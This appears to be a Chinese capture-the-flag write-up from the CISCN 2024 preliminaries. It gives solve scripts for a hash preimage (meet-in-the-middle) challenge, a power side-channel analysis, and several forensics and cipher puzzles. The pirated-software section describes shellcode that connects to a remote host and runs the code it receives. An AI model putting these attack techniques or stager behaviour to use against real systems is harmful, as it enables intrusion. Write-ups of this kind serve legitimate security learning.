<p><a target="_blank" rel="noopener" href="https://peps.python.org/pep-0456/">PEP 456 – Secure and interchangeable hash algorithm | </a><a target="_blank" rel="noopener" href="https://peps.python.org/pep-0456/">peps.python.org</a></p>
<p>也是同样关注 <strong><strong><strong><em>FNV</em></strong></strong></strong> 的具体实现。</p>
<h3 id="2-题目流程"><a href="#2-题目流程" class="headerlink" title="2.题目流程"></a><strong>2.题目流程</strong></h3><p>给出的题目里面 key 是随机给出的 7 位的十六进制 <code>bytes</code> 对象，通过 <code>hash()</code> 给出了一个值。</p>
<p>有映射 $x &#x3D; h(m)$ ，其中 $m$ 叫做原象，这个题目也就是考的原像攻击</p>
<p>然后将这个值进行 <code>sha384 签名</code> 后跟 <em>flag</em> 做异或。</p>
<p>针对原像攻击，第一反应就是爆破。但是 7 位十六进制显然过大，$256^7$ 显然不能在比赛期间完全爆破。那么很自然的想到，有没有办法减少搜索范围。于是有了 <strong>MITM</strong>  的思路。</p>
<p>减少一半字符，大概在 $256^3$ 那么就比较容易解决了。</p>
<h3 id="3-解题"><a href="#3-解题" class="headerlink" title="3.解题"></a><strong>3.解题</strong></h3><p>下面根据 python2.7 的 hash 实现，给出 FNV 这种结构的简易版本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">shash</span>(<span class="hljs-params">value</span>):<br>    length = <span class="hljs-built_in">len</span>(value)<br>    mask = <span class="hljs-number">0xffffffffffffffff</span><br>    x = (value[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">7</span>) &amp; mask<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> value:<br>        x = (<span class="hljs-number">1000003</span> * x) &amp; mask ^ c<br>    x ^= length &amp; mask<br>    <span class="hljs-keyword">return</span> x<br></code></pre></td></tr></table></figure>

<p>可以知道第一个字符被左移 7 位，而后再有</p>
<p><code>x = (1000003 * x) &amp; mask ^ c</code></p>
<p><code>x ^= length &amp; mask</code></p>
<p>那么尝试代入 MITM ，只要前四个字符跟后三个字符的逆是相同的，那就满足 key 的条件。</p>
<p><code>(x ^ c) &amp; mask = (1000003 * x)</code></p>
<p><code>x = (x ^ c) * 16109806864799210091 &amp; mask</code></p>
<p>注意，<code>16109806864799210091</code> 是 <code>1000003</code> 在模 $2^{64}$ 下的乘法逆元。</p>
<p>可以参考：</p>
<p><a target="_blank" rel="noopener" href="https://joostrijneveld.nl/posts/2023-11-25-write-ups-DUCTF-2023/#FNV">joostrijneveld.nl</a></p>
<h3 id="4-完整脚本"><a href="#4-完整脚本" class="headerlink" title="4.完整脚本"></a><strong>4.完整脚本</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><br>mask = <span class="hljs-number">0xffffffffffffffff</span><br>invmask = <span class="hljs-built_in">pow</span>(<span class="hljs-number">1000003</span>, -<span class="hljs-number">1</span>, mask + <span class="hljs-number">1</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">def shash(value):</span><br><span class="hljs-string">    length = len(value)</span><br><span class="hljs-string">    mask = 0xffffffffffffffff</span><br><span class="hljs-string">    x = (value[0] &lt;&lt; 7) &amp; mask</span><br><span class="hljs-string">    for c in value:</span><br><span class="hljs-string">        x = (1000003 * x) &amp; mask ^ c</span><br><span class="hljs-string">    x ^= length &amp; mask</span><br><span class="hljs-string">    return x</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">M1</span>(<span class="hljs-params">a, b, c, d</span>):<br>    x = (a &lt;&lt; <span class="hljs-number">7</span>) &amp; mask<br>    x = (<span class="hljs-number">1000003</span> * x) &amp; mask ^ a<br>    x = (<span class="hljs-number">1000003</span> * x) &amp; mask ^ b<br>    x = (<span class="hljs-number">1000003</span> * x) &amp; mask ^ c<br>    x = (<span class="hljs-number">1000003</span> * x) &amp; mask ^ d<br>    <span class="hljs-keyword">return</span> x<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">M2</span>(<span class="hljs-params">p, m, r, y</span>):<br>    y = (y ^ r) * invmask &amp; mask<br>    y = (y ^ m) * invmask &amp; mask<br>    y = (y ^ p) * invmask &amp; mask<br>    <span class="hljs-keyword">return</span> y<br><br>dic = &#123;&#125;<br><br><span class="hljs-comment"># x ^= length &amp; mask</span><br><span class="hljs-comment"># 7457312583301101235 ^ length &amp; mask = 7457312583301101236</span><br><br><span class="hljs-keyword">for</span> i, j, k <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>), repeat=<span class="hljs-number">3</span>):<br>    m = M2(i, j, k, y=<span class="hljs-number">7457312583301101236</span>)<br>    dic[m] = (i,j,k)<br><br><span class="hljs-keyword">for</span> a, b, c, d <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>), repeat=<span class="hljs-number">4</span>):<br>    m = M1(a, b, c, d)<br>    <span class="hljs-keyword">if</span> m <span class="hljs-keyword">in</span> dic:<br>        r = dic[m]<br>        <span class="hljs-built_in">print</span>(b, c, d, r)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;a:02x&#125;</span><span class="hljs-subst">&#123;b:02x&#125;</span><span class="hljs-subst">&#123;c:02x&#125;</span><span class="hljs-subst">&#123;d:02x&#125;</span><span class="hljs-subst">&#123;r[<span class="hljs-number">0</span>]:02x&#125;</span><span class="hljs-subst">&#123;r[<span class="hljs-number">1</span>]:02x&#125;</span><span class="hljs-subst">&#123;r[<span class="hljs-number">2</span>]:02x&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>key = <span class="hljs-string">b&#x27;5d8cf03f5a0852&#x27;</span><br>c = <span class="hljs-number">13903983817893117249931704406959869971132956255130487015289848690577655239262013033618370827749581909492660806312017</span><br><br>cc = <span class="hljs-built_in">int</span>(hashlib.sha384(key).hexdigest(),<span class="hljs-number">16</span>)<br><br><span class="hljs-built_in">print</span>(cc)<br><span class="hljs-built_in">print</span>(c^cc)<br><span class="hljs-built_in">print</span>(long_to_bytes(c^cc))<br><br><span class="hljs-comment"># 13903983817893096257191331302105079327691975168019975768926243203604911704907460100191445196042111296283969284429612</span><br><span class="hljs-comment"># 56006392793428027524350123064630944990050645714249173991561467554927772009567904795068631029075949437</span><br><span class="hljs-comment"># b&#x27;flag&#123;bdb537aa-87ef-4e95-bea4-2f79259bdd07&#125;&#x27;</span><br></code></pre></td></tr></table></figure>

<h3 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h3><h4 id="题目说明-7"><a href="#题目说明-7" class="headerlink" title="题目说明"></a>题目说明</h4><p>Atbash +base64 + caeser</p>
<h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/RxfubyoP0oSyDgx1Itfcs5ELnWg.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/RxfubyoP0oSyDgx1Itfcs5ELnWg.png"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="火锅链观光打卡"><a href="#火锅链观光打卡" class="headerlink" title="火锅链观光打卡"></a>火锅链观光打卡</h3><h4 id="题目说明-8"><a href="#题目说明-8" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p>连接钱包用 metamask</p>
<p>答对七个拿到 flag</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/QAXGbybzloCCSxx5U2dc1hhZnMh.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/QAXGbybzloCCSxx5U2dc1hhZnMh.png"></p>
<h3 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power Trajectory Diagram"></a>Power Trajectory Diagram</h3><h4 id="题目说明-9"><a href="#题目说明-9" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><p>侧信道攻击</p>
<p>正确输入字符在某些时间点会触发明显的功耗低谷,这个低谷比其他普通字符更低。通过找到每个数据块中最低的低谷,就能还原出对应的字符</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/A7mSbE2Vco3q94xj0LrcBQQOnvc.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/A7mSbE2Vco3q94xj0LrcBQQOnvc.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><br><span class="hljs-comment"># 加载数据</span><br>data = np.load(<span class="hljs-string">&#x27;C:\\Users\\Nanian233\\Desktop\\attachment.npz&#x27;</span>)<br>inputs = data[<span class="hljs-string">&#x27;input&#x27;</span>]<br>traces = data[<span class="hljs-string">&#x27;trace&#x27;</span>]<br><br><span class="hljs-comment"># 定义每组的字符数量</span><br>group_size = <span class="hljs-number">40</span><br><br><span class="hljs-comment"># 计算总组数</span><br>num_groups = <span class="hljs-built_in">len</span>(inputs) // group_size<br><br><span class="hljs-comment"># 绘制每一组的功耗曲线</span><br><span class="hljs-keyword">for</span> group <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_groups):<br>    start_idx = group * group_size<br>    end_idx = (group + <span class="hljs-number">1</span>) * group_size<br>    <br>    <span class="hljs-comment"># 提取当前组的输入字符和功耗曲线</span><br>    group_inputs = inputs[start_idx:end_idx]<br>    group_traces = traces[start_idx:end_idx]<br>    <br>    <span class="hljs-comment"># 找到当前组中功耗最低的曲线索引</span><br>    min_trace_idx = np.argmin([np.<span class="hljs-built_in">min</span>(trace) <span class="hljs-keyword">for</span> trace <span class="hljs-keyword">in</span> group_traces])<br>    <br>    <span class="hljs-comment"># 绘制当前组的所有功耗曲线</span><br>    plt.figure(figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">4</span>))<br>    <span class="hljs-keyword">for</span> i, trace <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(group_traces):<br>        plt.plot(trace, label=group_inputs[i], alpha=<span class="hljs-number">0.5</span>)<br>    <br>    <span class="hljs-comment"># 高亮显示功耗最低的曲线</span><br>    plt.plot(group_traces[min_trace_idx], label=group_inputs[min_trace_idx], linewidth=<span class="hljs-number">3</span>, color=<span class="hljs-string">&#x27;red&#x27;</span>)<br>    <br>    plt.title(<span class="hljs-string">f&#x27;Power Traces of Group <span class="hljs-subst">&#123;group+<span class="hljs-number">1</span>&#125;</span>&#x27;</span>)<br>    plt.xlabel(<span class="hljs-string">&#x27;Sample Points&#x27;</span>)<br>    plt.ylabel(<span class="hljs-string">&#x27;Power Consumption&#x27;</span>)<br>    plt.legend(loc=<span class="hljs-string">&#x27;upper right&#x27;</span>)<br>    plt.tight_layout()<br>    plt.show()<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>data = np.load(<span class="hljs-string">&#x27;C:\\Users\\Nanian233\\Desktop\\attachment.npz&#x27;</span>)<br>a= data[<span class="hljs-string">&#x27;input&#x27;</span>]<br>b = data[<span class="hljs-string">&#x27;trace&#x27;</span>]<br><br>result = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># 遍历数据块</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>    <span class="hljs-comment"># 获取当前数据块的输入</span><br>    sub_input = a[<span class="hljs-number">40</span> * i: <span class="hljs-number">40</span> * (i + <span class="hljs-number">1</span>)]<br>    <br>    <span class="hljs-comment"># 找到当前数据块中每行的最小值索引</span><br>    min1 = [np.argmin(b[i * <span class="hljs-number">40</span> + j]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>)]<br>    <br>    <span class="hljs-comment"># 找到最小值索引中的最大值索引</span><br>    min2 = np.argmax(min1)<br>    <br>    <span class="hljs-comment"># 将找到的字符追加到结果字符串</span><br>    result += sub_input[min2]<br><br><span class="hljs-comment"># 打印结果字符串</span><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<h3 id="通风机"><a href="#通风机" class="headerlink" title="通风机"></a>通风机</h3><h4 id="题目说明-10"><a href="#题目说明-10" class="headerlink" title="题目说明"></a>题目说明</h4><p>工控</p>
<h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p>西门子 7micro&#x2F;win 打开 wmp 文件</p>
<p>发现文件缺少文件头，补上即可打开</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/MoLQbulnao5Xa9xYp1eclcfvnwf.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/MoLQbulnao5Xa9xYp1eclcfvnwf.png"></p>
<p>符号表下找到一串 base64</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/LC85baaORoPAquxu7zqcOdQenxc.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/LC85baaORoPAquxu7zqcOdQenxc.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/VLbsb0tsBogNo2xnXbucJv5AnKe.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/VLbsb0tsBogNo2xnXbucJv5AnKe.png"></p>
<p>flag{2467ce26-fff9-4008-8d55-17df83ecbfc2}</p>
<h3 id="4-神秘文件"><a href="#4-神秘文件" class="headerlink" title="4. 神秘文件"></a>4. 神秘文件</h3><h4 id="题目说明-11"><a href="#题目说明-11" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h4><p>第一部分：</p>
<p>标题后面有密文</p>
<p>QFCfpPQ6ZymuM3gq</p>
<p>作者处有 key：lanjing</p>
<p>管理者处有加密方式：Bifid cipher</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/MLFXb3D4KohKa6xZtLQcw4aKnee.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/MLFXb3D4KohKa6xZtLQcw4aKnee.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/BqbAbpNQnomRntxYSRPcrfRvngd.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/BqbAbpNQnomRntxYSRPcrfRvngd.png"></p>
<p>第二部分：</p>
<p>把 pptm 改为 zip 并解压</p>
<p>&#x2F;ppt&#x2F;embeddings&#x2F; Microsoft_Word_Document.docx</p>
<p>Word 文档里改格式为正文</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/GsrVbcPOHo66H5xfg3rcz98wnDh.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/GsrVbcPOHo66H5xfg3rcz98wnDh.png"></p>
<p>枚举凯撒一个一个试</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/XhkBbefC8oOcWBxdF2mc4ggCnsd.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/XhkBbefC8oOcWBxdF2mc4ggCnsd.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/MHrTbNU6QojfvsxW6nScrK8on9N.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/MHrTbNU6QojfvsxW6nScrK8on9N.png"></p>
<p>第三部分：</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/G7HMb6ZLioIjWXx2fXWcWXUFnnh.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/G7HMb6ZLioIjWXx2fXWcWXUFnnh.png"></p>
<p>vba 的文件，用 oletools 反编译</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/H2W0bFoWDo55lzxMhufcvefFngd.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/H2W0bFoWDo55lzxMhufcvefFngd.png"></p>
<p>RC4 解密</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/PTBebFhN2osmruxYDNxcDpBinMd.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/PTBebFhN2osmruxYDNxcDpBinMd.png"></p>
<p>第四部分：</p>
<p>第三页 ppt 中直接解密</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/K2Ulbk4p2orLZaxnybCcAwOonZc.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/K2Ulbk4p2orLZaxnybCcAwOonZc.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/S6blb91mqo1oQ7xfemtcRU9Pnmg.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/S6blb91mqo1oQ7xfemtcRU9Pnmg.png"></p>
<p>第五部分：</p>
<p>第五页 ppt 底部拿到 base64 套娃密文</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/A6vfbIdV8o3L8XxIvCWcX0tOntf.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/A6vfbIdV8o3L8XxIvCWcX0tOntf.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/PW7ibWBkFowRHbxtPXGcJ0KfnBg.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/PW7ibWBkFowRHbxtPXGcJ0KfnBg.png"></p>
<p>第六部分：</p>
<p>同上页全选之后随机拖一拖找到密文</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Bxvpb6tlgoiCRjxO2Jsc6heynwc.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Bxvpb6tlgoiCRjxO2Jsc6heynwc.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/RQdgbqDneoVdnRxCtwXcj5nLnXb.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/RQdgbqDneoVdnRxCtwXcj5nLnXb.png"></p>
<p>第七部分：</p>
<p>&#x2F;ppt&#x2F;slides&#x2F;slide4.xml</p>
<p>拿到密文和加密方式</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Jtg3bPz82owLVPx0puNc4n9Anvc.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/Jtg3bPz82owLVPx0puNc4n9Anvc.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/LOJSbc2YVoCx9fxOqJycKt5Ynwd.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/LOJSbc2YVoCx9fxOqJycKt5Ynwd.png"></p>
<p>第八部分：</p>
<p>&#x2F;ppt&#x2F;slideLayouts&#x2F;slideLayout2.xml 拿到提示</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/SstVbyMXKojukxxuygOcc3dGnMb.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/SstVbyMXKojukxxuygOcc3dGnMb.png"></p>
<p>去掉 B b 1 3 后解密</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/OwRBbIOZKoNApBxo6O9cTja7nfb.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/OwRBbIOZKoNApBxo6O9cTja7nfb.png"></p>
<p>第九部分：</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/A8YKb12rBoYayGxxkZncEGjCnAd.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/A8YKb12rBoYayGxxkZncEGjCnAd.png"></p>
<p>ppt5 中间图里面还有一张残缺图，在源文件处可以拿到完整的</p>
<p>第十部分：</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/RxlbbgwxRowYulxzXVNcR7Qsn3f.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/RxlbbgwxRowYulxzXVNcR7Qsn3f.png"></p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/N9V2bmMVXojvypxJE9ecp9KYnUd.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/N9V2bmMVXojvypxJE9ecp9KYnUd.png"></p>
<h3 id="盗版软件"><a href="#盗版软件" class="headerlink" title="盗版软件"></a>盗版软件</h3><h4 id="题目说明-12"><a href="#题目说明-12" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h4><p>先直接 strings 看看有啥玩意</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/CFa5bdIYmoFxUOxmQMxcqw6znuc.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/CFa5bdIYmoFxUOxmQMxcqw6znuc.png"></p>
<p>发现访问了很多网页，讯飞，火狐，百度等</p>
<p>看到一个叫 winhack.exe 的，出现次数很多，怀疑是这个</p>
<p>Strings -e | 3842.dmp |winhack  找到 <code>winhack.com</code></p>
<p>hackexe.exe 运行后打开.ss 得到 output.png</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/AbOMbhOhdoUMycxMMPucPjUEn3e.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/AbOMbhOhdoUMycxMMPucPjUEn3e.png"></p>
<p>Stegsolve 出一个 zip 文件，但有杂糅，gpt 个脚本删一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php">def <span class="hljs-title function_ invoke__">process_file</span>(input_file, output_file):<br>    <span class="hljs-keyword">try</span>:<br>        with <span class="hljs-title function_ invoke__">open</span>(input_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            data = f.<span class="hljs-title function_ invoke__">read</span>()<br>        <br>        <span class="hljs-comment"># Extract every other byte</span><br>        new_data = data[::<span class="hljs-number">2</span>]<br><br>        with <span class="hljs-title function_ invoke__">open</span>(output_file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.<span class="hljs-title function_ invoke__">write</span>(new_data)<br><br>        <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;Processed file saved as &#123;output_file&#125;&quot;</span>)<br><br>    except FileNotFoundError:<br>        <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;Error: The file &#123;input_file&#125; does not exist.&quot;</span>)<br>    except <span class="hljs-built_in">Exception</span> <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;An error occurred: &#123;e&#125;&quot;</span>)<br><br><span class="hljs-comment"># Usage</span><br>input_file = <span class="hljs-string">&#x27;inputfile&#x27;</span>  <span class="hljs-comment"># replace with your input file name without suffix</span><br>output_file = <span class="hljs-string">&#x27;outputfile&#x27;</span>  <span class="hljs-comment"># replace with your desired output file name without suffix</span><br><span class="hljs-title function_ invoke__">process_file</span>(input_file, output_file)<br></code></pre></td></tr></table></figure>

<p>解压后得到.b 文件，打开是 base85</p>
<p>解码后转 hex 丢 gpt</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">这段经过<span class="hljs-built_in">hex</span>编码的代码是一段Windows平台的x64 shellcode。解码后的内容大致如下:<br>首先通过一系列指令对栈进行了对齐操作,并保存了一些寄存器的值。<br>然后获取了当前进程的PEB(Process Environment Block)地址,并从中获取了当前进程的基址ImageBaseAddress。<br>接着通过解析PE头,遍历导入表,找到了kernel32.dll的基址。<br>然后根据导入表中函数名称的哈希值,定位到了GetProcAddress函数的地址。<br>有了GetProcAddress函数后,就可以动态获取其他Windows API函数的地址了,比如LoadLibraryA、VirtualAlloc、WSAStartup等。<br>接下来调用WSAStartup初始化套接字,再调用WSASocketA创建了一个TCP Socket。<br>然后通过调用connect函数,连接到了特定的IP地址和端口(族ke编码所以ip看不出来)。<br>连接成功后,再次调用VirtualAlloc分配一块可读可写可执行的内存,用于后续接收和执行远程代码。<br>最后不断调用recv从socket接收数据到上述分配的内存中,并调用CreateThread创建线程从内存起始位置开始执行。<br></code></pre></td></tr></table></figure>

<p>可以试着写一个 loader 然后在本地运行用 winshark 抓包，但是直接保存到 bin 然后丢微步也能识别到特征</p>
<p class='item-img' data-src='/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/MXZubEafEoCYoWxv55ec09b3nGf.png'><img src="/2024/05/23/CISCN2024%E5%88%9D%E8%B5%9B/MXZubEafEoCYoWxv55ec09b3nGf.png"></p>
